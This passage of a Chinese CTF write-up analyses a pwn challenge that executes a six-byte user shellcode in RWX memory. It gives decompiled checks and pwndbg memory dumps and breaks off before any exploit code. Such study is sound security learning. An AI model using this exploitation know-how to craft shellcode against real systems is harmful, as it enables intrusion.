<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">check_shellcode</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v2; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">int</span> j; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v2 = <span class="number">0</span>;</span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">5</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *(i + a1) &amp; <span class="number">1</span> )                        <span class="comment">// 该字节最低位为1</span></span><br><span class="line">      ++v2;</span><br><span class="line">    <span class="keyword">else</span>                                        <span class="comment">// 该字节最低位为0</span></span><br><span class="line">      ++v3;</span><br><span class="line">    <span class="keyword">for</span> ( j = i + <span class="number">1</span>; j &lt;= <span class="number">5</span>; ++j )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *(i + a1) == *(j + a1) )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Invalid shellcode!"</span>);             <span class="comment">// 6个字节互不相同</span></span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  result = v2;</span><br><span class="line">  <span class="keyword">if</span> ( v2 != v3 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Invalid shellcode!"</span>);                 <span class="comment">// 三个字节为偶数，三个字节为奇数</span></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>此函数对我们传入的6字节shellcode进行了判断，shellcode应该满足的条件是，6个字节的值会不相等，并且三个字节为偶数，三个字节为奇数，才是有效的shellcode,否则退出。</p>
<p>我们再来看看接下来，主程序做了什么。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">v9 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">rand_mmap2();                                 <span class="comment">// 分配两块大小为0x1000的内存，起始地址随机</span></span><br><span class="line">v3 = dest;                                    <span class="comment">// 分配的具有RWX权限内存的起始地址</span></span><br><span class="line"><span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">8u</span>LL);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"Show Ne0 your shellcode:"</span>);</span><br><span class="line">read(<span class="number">0</span>, &amp;s, <span class="number">6u</span>LL);                            <span class="comment">// 输入6个字节shellcode</span></span><br><span class="line">check_shellcode(&amp;s);                          <span class="comment">// 检查shellcode格式</span></span><br><span class="line">v4 = <span class="built_in">strlen</span>(src);</span><br><span class="line"><span class="built_in">memcpy</span>(dest, src, v4);                        <span class="comment">// 将src处的数据复制到dest,dest具有X权限</span></span><br><span class="line">v5 = dest;</span><br><span class="line">v6 = <span class="built_in">strlen</span>(src);</span><br><span class="line"><span class="built_in">memcpy</span>(&amp;v5[v6], &amp;s, <span class="number">7u</span>LL);                    <span class="comment">// 将我们输入的shellcode放在src后面</span></span><br><span class="line">v3(fake_stack, &amp;s);                           <span class="comment">// 调用dest处的shellcode</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0L</span>L;</span><br></pre></td></tr></table></figure>
<p>首先程序分配了两块0x1000的内存，然后让我们输入了6字节的shellcode，并对shellcode进行检查。然后将src处的数据复制到刚才分配的具有可执行权限的内存块，然后将我们输入的shellcode接在src的后面，然后执行。不具有可执行权限的内存块用于伪造栈。</p>
<p>通过gdb调试，我们可以知道，当从/dev/urandom读出来的数值较大时，mmap随机进行分配内存块。而当二者均随机分配时，则这两个内存块有可能是相连的。这里第一次分配的内存块在高地址，用于存放shellcode,第二次分配的内存块在低地址，用于伪造栈。至于这里为什么第一次分配的内存块在高地址，而第二次的在低地址，我还没有搞清楚这里面的机制。看的资料都说是随机分配，没找到具体的。</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、第一次调试</span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ <span class="built_in">rsp</span>  <span class="number">0x7fffffffdcc0</span> ◂— <span class="number">0x300000001</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│      <span class="number">0x7fffffffdcc8</span> ◂— <span class="number">0xa563d35f2600</span> 第二块</span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│ <span class="built_in">rsi</span>  <span class="number">0x7fffffffdcd0</span> ◂— <span class="number">0x703df49340fc</span> 第一块</span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│      <span class="number">0x7fffffffdcd8</span> ◂— <span class="number">0xdd44ac71043c3600</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│ <span class="built_in">rbp</span>  <span class="number">0x7fffffffdce0</span> —▸ <span class="number">0x7fffffffdd20</span> —▸ <span class="number">0x555555554cc0</span> ◂— <span class="keyword">push</span>   <span class="built_in">r15</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│      <span class="number">0x7fffffffdce8</span> —▸ <span class="number">0x555555554be8</span> ◂— <span class="keyword">mov</span>    <span class="built_in">rax</span>, <span class="built_in">qword</span> <span class="built_in">ptr</span> [<span class="built_in">rip</span> + <span class="number">0x2014a1</span>]</span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│      <span class="number">0x7fffffffdcf0</span> —▸ <span class="number">0x7fffffffdd1e</span> ◂— <span class="number">0x555555554cc00000</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│      <span class="number">0x7fffffffdcf8</span> ◂— <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line"> ► <span class="number">0x555555554aa8</span>    <span class="keyword">call</span>   mmap@plt &lt;<span class="number">0x555555554840</span>&gt;</span><br><span class="line"><span class="symbol">        addr:</span> <span class="number">0x703df4934000</span></span><br><span class="line"><span class="symbol">        len:</span> <span class="number">0x1000</span></span><br><span class="line"><span class="symbol">        prot:</span> <span class="number">0x7</span></span><br><span class="line"><span class="symbol">        flags:</span> <span class="number">0x22</span></span><br><span class="line"><span class="symbol">        fd:</span> <span class="number">0xffffffff</span></span><br><span class="line"><span class="symbol">        offset:</span> <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line">第一块分配前</span><br><span class="line">pwndbg&gt; vmmap</span><br><span class="line"><span class="symbol">LEGEND:</span> STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">    <span class="number">0x555555554000</span>     <span class="number">0x555555555000</span> r-xp     <span class="number">1000</span> <span class="number">0</span>      /home/buffer/Desktop/six/six</span><br><span class="line">    <span class="number">0x555555755000</span>     <span class="number">0x555555756000</span> r--p     <span class="number">1000</span> <span class="number">1000</span>   /home/buffer/Desktop/six/six</span><br><span class="line">    <span class="number">0x555555756000</span>     <span class="number">0x555555757000</span> rw-p     <span class="number">1000</span> <span class="number">2000</span>   /home/buffer/Desktop/six/six</span><br><span class="line">    <span class="number">0x7ffff7a0d000</span>     <span class="number">0x7ffff7bcd000</span> r-xp   1c0000 <span class="number">0</span>      /lib/x86_64-linux-gnu/libc-<span class="number">2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7bcd000</span>     <span class="number">0x7ffff7dcd000</span> ---p   <span class="number">200000</span> 1c0000 /lib/x86_64-linux-gnu/libc-<span class="number">2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7dcd000</span>     <span class="number">0x7ffff7dd1000</span> r--p     <span class="number">4000</span> 1c0000 /lib/x86_64-linux-gnu/libc-<span class="number">2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7dd1000</span>     <span class="number">0x7ffff7dd3000</span> rw-p     <span class="number">2000</span> 1c4000 /lib/x86_64-linux-gnu/libc-<span class="number">2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7dd3000</span>     <span class="number">0x7ffff7dd7000</span> rw-p     <span class="number">4000</span> <span class="number">0</span>      </span><br><span class="line">    <span class="number">0x7ffff7dd7000</span>     <span class="number">0x7ffff7dfd000</span> r-xp    <span class="number">26000</span> <span class="number">0</span>      /lib/x86_64-linux-gnu/ld-<span class="number">2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7fd3000</span>     <span class="number">0x7ffff7fd6000</span> rw-p     <span class="number">3000</span> <span class="number">0</span>      </span><br><span class="line">    <span class="number">0x7ffff7ff7000</span>     <span class="number">0x7ffff7ffa000</span> r--p     <span class="number">3000</span> <span class="number">0</span>      [vvar]</span><br><span class="line">    <span class="number">0x7ffff7ffa000</span>     <span class="number">0x7ffff7ffc000</span> r-xp     <span class="number">2000</span> <span class="number">0</span>      [vdso]</span><br><span class="line">    <span class="number">0x7ffff7ffc000</span>     <span class="number">0x7ffff7ffd000</span> r--p     <span class="number">1000</span> <span class="number">25000</span>  /lib/x86_64-linux-gnu/ld-<span class="number">2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7ffd000</span>     <span class="number">0x7ffff7ffe000</span> rw-p     <span class="number">1000</span> <span class="number">26000</span>  /lib/x86_64-linux-gnu/ld-<span class="number">2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7ffe000</span>     <span class="number">0x7ffff7fff000</span> rw-p     <span class="number">1000</span> <span class="number">0</span>      </span><br><span class="line">    <span class="number">0x7ffffffde000</span>     <span class="number">0x7ffffffff000</span> rw-p    <span class="number">21000</span> <span class="number">0</span>      [stack]</span><br><span class="line"><span class="number">0xffffffffff600000</span> <span class="number">0xffffffffff601000</span> r-xp     <span class="number">1000</span> <span class="number">0</span>      [vsyscall]</span><br><span class="line"></span><br><span class="line">第一块分配后</span><br><span class="line">pwndbg&gt; vmmap</span><br><span class="line"><span class="symbol">LEGEND:</span> STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">    <span class="number">0x555555554000</span>     <span class="number">0x555555555000</span> r-xp     <span class="number">1000</span> <span class="number">0</span>      /home/buffer/Desktop/six/six</span><br><span class="line">    <span class="number">0x555555755000</span>     <span class="number">0x555555756000</span> r--p     <span class="number">1000</span> <span class="number">1000</span>   /home/buffer/Desktop/six/six</span><br><span class="line">    <span class="number">0x555555756000</span>     <span class="number">0x555555757000</span> rw-p     <span class="number">1000</span> <span class="number">2000</span>   /home/buffer/Desktop/six/six</span><br><span class="line">    <span class="number">0x703df4934000</span>     <span class="number">0x703df4935000</span> rwxp     <span class="number">1000</span> <span class="number">0</span>      第一块      </span><br><span class="line">    <span class="number">0x7ffff7a0d000</span>     <span class="number">0x7ffff7bcd000</span> r-xp   1c0000 <span class="number">0</span>      /lib/x86_64-linux-gnu/libc-<span class="number">2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7bcd000</span>     <span class="number">0x7ffff7dcd000</span> ---p   <span class="number">200000</span> 1c0000 /lib/x86_64-linux-gnu/libc-<span class="number">2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7dcd000</span>     <span class="number">0x7ffff7dd1000</span> r--p     <span class="number">4000</span> 1c0000 /lib/x86_64-linux-gnu/libc-<span class="number">2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7dd1000</span>     <span class="number">0x7ffff7dd3000</span> rw-p     <span class="number">2000</span> 1c4000 /lib/x86_64-linux-gnu/libc-<span class="number">2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7dd3000</span>     <span class="number">0x7ffff7dd7000</span> rw-p     <span class="number">4000</span> <span class="number">0</span>      </span><br><span class="line">    <span class="number">0x7ffff7dd7000</span>     <span class="number">0x7ffff7dfd000</span> r-xp    <span class="number">26000</span> <span class="number">0</span>      /lib/x86_64-linux-gnu/ld-<span class="number">2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7fd3000</span>     <span class="number">0x7ffff7fd6000</span> rw-p     <span class="number">3000</span> <span class="number">0</span>      </span><br><span class="line">    <span class="number">0x7ffff7ff7000</span>     <span class="number">0x7ffff7ffa000</span> r--p     <span class="number">3000</span> <span class="number">0</span>      [vvar]</span><br><span class="line">    <span class="number">0x7ffff7ffa000</span>     <span class="number">0x7ffff7ffc000</span> r-xp     <span class="number">2000</span> <span class="number">0</span>      [vdso]</span><br><span class="line">    <span class="number">0x7ffff7ffc000</span>     <span class="number">0x7ffff7ffd000</span> r--p     <span class="number">1000</span> <span class="number">25000</span>  /lib/x86_64-linux-gnu/ld-<span class="number">2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7ffd000</span>     <span class="number">0x7ffff7ffe000</span> rw-p     <span class="number">1000</span> <span class="number">26000</span>  /lib/x86_64-linux-gnu/ld-<span class="number">2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7ffe000</span>     <span class="number">0x7ffff7fff000</span> rw-p     <span class="number">1000</span> <span class="number">0</span>      </span><br><span class="line">    <span class="number">0x7ffffffde000</span>     <span class="number">0x7ffffffff000</span> rw-p    <span class="number">21000</span> <span class="number">0</span>      [stack]</span><br><span class="line"><span class="number">0xffffffffff600000</span> <span class="number">0xffffffffff601000</span> r-xp     <span class="number">1000</span> <span class="number">0</span>      [vsyscall]</span><br><span class="line"></span><br><span class="line"> ► <span class="number">0x555555554adc</span>    <span class="keyword">call</span>   mmap@plt &lt;<span class="number">0x555555554840</span>&gt;</span><br><span class="line"><span class="symbol">        addr:</span> <span class="number">0xa563d35f2000</span></span><br><span class="line"><span class="symbol">        len:</span> <span class="number">0x1000</span></span><br><span class="line"><span class="symbol">        prot:</span> <span class="number">0x3</span></span><br><span class="line"><span class="symbol">        flags:</span> <span class="number">0x22</span></span><br><span class="line"><span class="symbol">        fd:</span> <span class="number">0xffffffff</span></span><br><span class="line"><span class="symbol">        offset:</span> <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line">第二块分配后</span><br><span class="line">pwndbg&gt; vmmap</span><br><span class="line"><span class="symbol">LEGEND:</span> STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">    <span class="number">0x555555554000</span>     <span class="number">0x555555555000</span> r-xp     <span class="number">1000</span> <span class="number">0</span>      /home/buffer/Desktop/six/six</span><br><span class="line">    <span class="number">0x555555755000</span>     <span class="number">0x555555756000</span> r--p     <span class="number">1000</span> <span class="number">1000</span>   /home/buffer/Desktop/six/six</span><br><span class="line">    <span class="number">0x555555756000</span>     <span class="number">0x555555757000</span> rw-p     <span class="number">1000</span> <span class="number">2000</span>   /home/buffer/Desktop/six/six</span><br><span class="line">    <span class="number">0x703df4934000</span>     <span class="number">0x703df4935000</span> rwxp     <span class="number">1000</span> <span class="number">0</span>      第一块</span><br><span class="line">    <span class="number">0x7ffff7a0d000</span>     <span class="number">0x7ffff7bcd000</span> r-xp   1c0000 <span class="number">0</span>      /lib/x86_64-linux-gnu/libc-<span class="number">2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7bcd000</span>     <span class="number">0x7ffff7dcd000</span> ---p   <span class="number">200000</span> 1c0000 /lib/x86_64-linux-gnu/libc-<span class="number">2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7dcd000</span>     <span class="number">0x7ffff7dd1000</span> r--p     <span class="number">4000</span> 1c0000 /lib/x86_64-linux-gnu/libc-<span class="number">2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7dd1000</span>     <span class="number">0x7ffff7dd3000</span> rw-p     <span class="number">2000</span> 1c4000 /lib/x86_64-linux-gnu/libc-<span class="number">2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7dd3000</span>     <span class="number">0x7ffff7dd7000</span> rw-p     <span class="number">4000</span> <span class="number">0</span>      </span><br><span class="line">    <span class="number">0x7ffff7dd7000</span>     <span class="number">0x7ffff7dfd000</span> r-xp    <span class="number">26000</span> <span class="number">0</span>      /lib/x86_64-linux-gnu/ld-<span class="number">2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7fd3000</span>     <span class="number">0x7ffff7fd6000</span> rw-p     <span class="number">3000</span> <span class="number">0</span>      </span><br><span class="line">    <span class="number">0x7ffff7ff6000</span>     <span class="number">0x7ffff7ff7000</span> rw-p     <span class="number">1000</span> <span class="number">0</span>      第二块，地址不是/dev/urandom出来的地址，因为数值较大，mmap随机分配</span><br><span class="line">    <span class="number">0x7ffff7ff7000</span>     <span class="number">0x7ffff7ffa000</span> r--p     <span class="number">3000</span> <span class="number">0</span>      [vvar]</span><br><span class="line">    <span class="number">0x7ffff7ffa000</span>     <span class="number">0x7ffff7ffc000</span> r-xp     <span class="number">2000</span> <span class="number">0</span>      [vdso]</span><br><span class="line">    <span class="number">0x7ffff7ffc000</span>     <span class="number">0x7ffff7ffd000</span> r--p     <span class="number">1000</span> <span class="number">25000</span>  /lib/x86_64-linux-gnu/ld-<span class="number">2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7ffd000</span>     <span class="number">0x7ffff7ffe000</span> rw-p     <span class="number">1000</span> <span class="number">26000</span>  /lib/x86_64-linux-gnu/ld-<span class="number">2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7ffe000</span>     <span class="number">0x7ffff7fff000</span> rw-p     <span class="number">1000</span> <span class="number">0</span>      </span><br><span class="line">    <span class="number">0x7ffffffde000</span>     <span class="number">0x7ffffffff000</span> rw-p    <span class="number">21000</span> <span class="number">0</span>      [stack]</span><br><span class="line"><span class="number">0xffffffffff600000</span> <span class="number">0xffffffffff601000</span> r-xp     <span class="number">1000</span> <span class="number">0</span>      [vsyscall]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">2</span>、第二次调试</span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ <span class="built_in">rsp</span>  <span class="number">0x7fffffffdcc0</span> ◂— <span class="number">0x300000001</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│      <span class="number">0x7fffffffdcc8</span> ◂— <span class="number">0xeccb72e069a9</span> 第二块</span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│      <span class="number">0x7fffffffdcd0</span> ◂— <span class="number">0xd1c2fd207617</span> 第一块</span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│      <span class="number">0x7fffffffdcd8</span> ◂— <span class="number">0x4193ac317ff71a00</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│ <span class="built_in">rbp</span>  <span class="number">0x7fffffffdce0</span> —▸ <span class="number">0x7fffffffdd20</span> —▸ <span class="number">0x555555554cc0</span> ◂— <span class="keyword">push</span>   <span class="built_in">r15</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│      <span class="number">0x7fffffffdce8</span> —▸ <span class="number">0x555555554be8</span> ◂— <span class="keyword">mov</span>    <span class="built_in">rax</span>, <span class="built_in">qword</span> <span class="built_in">ptr</span> [<span class="built_in">rip</span> + <span class="number">0x2014a1</span>]</span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│      <span class="number">0x7fffffffdcf0</span> —▸ <span class="number">0x7fffffffdd1e</span> ◂— <span class="number">0x555555554cc00000</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│      <span class="number">0x7fffffffdcf8</span> ◂— <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">第一块分配前</span><br><span class="line"> ► <span class="number">0x555555554aa8</span>    <span class="keyword">call</span>   mmap@plt &lt;<span class="number">0x555555554840</span>&gt;</span><br><span class="line"><span class="symbol">        addr:</span> <span class="number">0xd1c2fd207000</span></span><br><span class="line"><span class="symbol">        len:</span> <span class="number">0x1000</span></span><br><span class="line"><span class="symbol">        prot:</span> <span class="number">0x7</span></span><br><span class="line"><span class="symbol">        flags:</span> <span class="number">0x22</span></span><br><span class="line"><span class="symbol">        fd:</span> <span class="number">0xffffffff</span></span><br><span class="line"><span class="symbol">        offset:</span> <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line">pwndbg&gt; vmmap</span><br><span class="line"><span class="symbol">LEGEND:</span> STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">    <span class="number">0x555555554000</span>     <span class="number">0x555555555000</span> r-xp     <span class="number">1000</span> <span class="number">0</span>      /home/buffer/Desktop/six/six</span><br><span class="line">    <span class="number">0x555555755000</span>     <span class="number">0x555555756000</span> r--p     <span class="number">1000</span> <span class="number">1000</span>   /home/buffer/Desktop/six/six</span><br><span class="line">    <span class="number">0x555555756000</span>     <span class="number">0x555555757000</span> rw-p     <span class="number">1000</span> <span class="number">2000</span>   /home/buffer/Desktop/six/six</span><br><span class="line">    <span class="number">0x7ffff7a0d000</span>     <span class="number">0x7ffff7bcd000</span> r-xp   1c0000 <span class="number">0</span>      /lib/x86_64-linux-gnu/libc-<span class="number">2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7bcd000</span>     <span class="number">0x7ffff7dcd000</span> ---p   <span class="number">200000</span> 1c0000 /lib/x86_64-linux-gnu/libc-<span class="number">2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7dcd000</span>     <span class="number">0x7ffff7dd1000</span> r--p     <span class="number">4000</span> 1c0000 /lib/x86_64-linux-gnu/libc-<span class="number">2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7dd1000</span>     <span class="number">0x7ffff7dd3000</span> rw-p     <span class="number">2000</span> 1c4000 /lib/x86_64-linux-gnu/libc-<span class="number">2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7dd3000</span>     <span class="number">0x7ffff7dd7000</span> rw-p     <span class="number">4000</span> <span class="number">0</span>      </span><br><span class="line">    <span class="number">0x7ffff7dd7000</span>     <span class="number">0x7ffff7dfd000</span> r-xp    <span class="number">26000</span> <span class="number">0</span>      /lib/x86_64-linux-gnu/ld-<span class="number">2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7fd3000</span>     <span class="number">0x7ffff7fd6000</span> rw-p     <span class="number">3000</span> <span class="number">0</span>      </span><br><span class="line">    <span class="number">0x7ffff7ff7000</span>     <span class="number">0x7ffff7ffa000</span> r--p     <span class="number">3000</span> <span class="number">0</span>      [vvar]</span><br><span class="line">    <span class="number">0x7ffff7ffa000</span>     <span class="number">0x7ffff7ffc000</span> r-xp     <span class="number">2000</span> <span class="number">0</span>      [vdso]</span><br><span class="line">    <span class="number">0x7ffff7ffc000</span>     <span class="number">0x7ffff7ffd000</span> r--p     <span class="number">1000</span> <span class="number">25000</span>  /lib/x86_64-linux-gnu/ld-<span class="number">2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7ffd000</span>     <span class="number">0x7ffff7ffe000</span> rw-p     <span class="number">1000</span> <span class="number">26000</span>  /lib/x86_64-linux-gnu/ld-<span class="number">2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7ffe000</span>     <span class="number">0x7ffff7fff000</span> rw-p     <span class="number">1000</span> <span class="number">0</span>      </span><br><span class="line">    <span class="number">0x7ffffffde000</span>     <span class="number">0x7ffffffff000</span> rw-p    <span class="number">21000</span> <span class="number">0</span>      [stack]</span><br><span class="line"><span class="number">0xffffffffff600000</span> <span class="number">0xffffffffff601000</span> r-xp     <span class="number">1000</span> <span class="number">0</span>      [vsyscall]</span><br><span class="line"></span><br><span class="line">第一块分配后</span><br><span class="line">pwndbg&gt; vmmap</span><br><span class="line"><span class="symbol">LEGEND:</span> STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">    <span class="number">0x555555554000</span>     <span class="number">0x555555555000</span> r-xp     <span class="number">1000</span> <span class="number">0</span>      /home/buffer/Desktop/six/six</span><br><span class="line">    <span class="number">0x555555755000</span>     <span class="number">0x555555756000</span> r--p     <span class="number">1000</span> <span class="number">1000</span>   /home/buffer/Desktop/six/six</span><br><span class="line">    <span class="number">0x555555756000</span>     <span class="number">0x555555757000</span> rw-p     <span class="number">1000</span> <span class="number">2000</span>   /home/buffer/Desktop/six/six</span><br><span class="line">    <span class="number">0x7ffff7a0d000</span>     <span class="number">0x7ffff7bcd000</span> r-xp   1c0000 <span class="number">0</span>      /lib/x86_64-linux-gnu/libc-<span class="number">2.23</span>.so</span><br><span class="line"> 